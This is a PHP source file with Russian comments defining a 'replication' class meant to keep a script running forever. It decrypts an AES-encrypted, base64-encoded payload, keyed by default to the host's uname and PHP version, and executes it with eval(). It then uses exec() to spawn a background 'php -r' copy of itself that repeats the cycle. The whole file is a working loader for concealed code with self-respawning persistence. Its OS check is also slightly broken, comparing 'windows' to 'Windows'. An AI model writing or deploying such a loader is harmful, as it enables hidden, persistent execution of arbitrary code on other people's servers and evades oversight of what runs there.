<?php
  //Класс отвественный за бесконечное повторение кода.
  //Скрипт вечно живой!!!
  class replication{
  	  
  	  
  	  
	  //Конструктор класса.
	  /*
	  $code - шифрованный код скрипта репликации.
	  $codeStart - шифрованный выполняемый код.
	  $wiev - Флаг вывода результата выполнения скрипта в консоль.
	  $key - ключ шифрования скрипта.
	  */
	  function __construct($code = null, $codeStart = null, $key = null, $wiev = false){
		  if($codeStart != null && $code != null){								//Проверка необходимого.
			  $codeRep = $codeStart;											//Фиксируем код репликации.
			  $codeStart = $this->decode($codeStart, $key);						//Декодирование кода.
			  $codeStart = $this->codePreparation($codeStart);					//Подготавливаем код к выполнению.
			  if($this->validatorCode($codeStart)){								//Проводим валидацию кода.
				  eval($codeStart);												//Выполнение кода.
				  $cmd = $this->PrepCmdRep($code, $codeRep, $key, $wiev);		//Готовим команду репликации.
				  if($cmd != ''){												//Проверка наличия комманды.
					  exec($cmd);												//Выполнение репликации.
				  }
			  }
			  else{																//Если валидация не пройдена, то.
				  unset($codeRep);												//Удаляем не валидний код.
			  } 
		  }
		  unset($code, $codeStart, $key, $wiev);								//Сброс отработанных переменных.  
	  }
	  
	  
	  //Деструктор класса.
	  function __destruct(){
		  gc_collect_cycles();
	  }
	  
	  //Метод определения ОС.
	  function definitionOS(){
		  setlocale(LC_ALL, "en_US");
          $sysname = php_uname();
          if(substr($sysname, 0, 5) === "Linux"){
            return "linux";
	      } 
	      if(substr($sysname, 0, 6) === "Darwin"){
	      	  return "osx";
	      }
	      if(substr($sysname, 0, 7) === "Windows"){
	      	  return "windows";
	      }
	      if(substr($sysname, 0, 7) === "FreeBSD"){
	      	  return "freebsd";
	      }
	  }
	  
	  //Метод подготовки кода.
	  function codePreparation($code = null){
		  if($code != null){
			  $code = str_replace("?>","", $code);
			  $code = str_replace("<?php","", $code);
			  $code = str_replace("<?","", $code);
			  while(count(explode("

", $code)) >= 2){
				  $code = str_replace("

","
", $code);
			  }
			  return $code;
		  }
	  }
	  
	  //Метод проверки кода на аутотентичность.
	  function validatorCode($code = null){
		  if($code != null){
		  	  $verification = '//@replication';
			  if(count(explode($verification, $code)) >= 2){
				  return true;
			  }
		  }
		  return false;
	  }
	  
	  //Метод декодирования.
	  function decode($encoded, $key = null){
  		  $encoded = base64_decode($encoded);									//Перекодируем из base64
  		  $iv = substr($encoded, 0, 16);
  		  $encoded = substr($encoded, 16);										//Удаляем вектор из текста.
  		  if($key == null){														//Если ключа нет.
			  $key = pack("H*", md5(php_uname().phpversion()));
  		  }
  		  else{																	//Если ключ есть.
			  $key = pack("H*", md5($key));
  		  }
  		  $encoded = openssl_decrypt($encoded, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);
	      unset($iv, $key);
	      return $encoded;														//Возвращаем результат.
	  }
	  
	  //Метод кодирования.
	  function encode($unencoded, $key = null){
	      $iv = openssl_random_pseudo_bytes(16);
	      if($key == null){
			  $key = pack("H*", md5(php_uname().phpversion()));
	      }
	      else{
			  $key = pack("H*", md5($key));
	      }
	      $unencoded =  openssl_encrypt($unencoded, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);
	      $unencoded = $iv.$unencoded;												//Пишем ключ в зашифрованный код.
	      $unencoded = base64_encode($unencoded);									//Перекодируем зашифрованный текст в base64
	      return $unencoded;														//Возвращаем результат.
	  }
	  
	  
	  //Метод формирования кода декодера.
	  function getCodeDecode(){
		  return 'function decode($encoded, $key = null){
  					  $encoded = base64_decode($encoded);
  					  $iv = substr($encoded, 0, 16);
  					  $encoded = substr($encoded, 16);
  					  if($key == null){
						  $key = pack("H*", md5(php_uname().phpversion()));
  					  }
  					  else{
						  $key = pack("H*", md5($key));
  					  }
  					  $encoded = openssl_decrypt($encoded, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);
				      unset($iv, $key);
				      return $encoded;
				  }';
	  }
	  
	  
	  
	  //Метод подготовки комманды репликации скрипта.
	  function PrepCmdRep($code = null, $codeStart = null, $key = null, $wiev){
	  	  if($codeStart != null && $code != null){								//Проверка необходимого.
			  if($this->definitionOS() != "Windows" && $wiev){					//Проверка ОС.
				  $cmd = "php -r '".$this->getCodeDecode().' $c = decode("'.$code.'", "'.$key.'"); eval($c); $s = new replication("'.$code.'", "'.$codeStart.'", "'.$key.'", '.$wiev.'); unset($c, $s); '."' > /dev/console &";
			  }
			  else{																//Если Windows.
				  $cmd = "php -r '".$this->getCodeDecode().' $c = decode("'.$code.'", "'.$key.'"); eval($c); $s = new replication("'.$code.'", "'.$codeStart.'", "'.$key.'", '.$wiev.'); unset($c, $s);'."'";
			  }
			  unset($code, $codeStart, $key, $wiev);
			  return $cmd;
	  	  }
	  } 
  }
?>
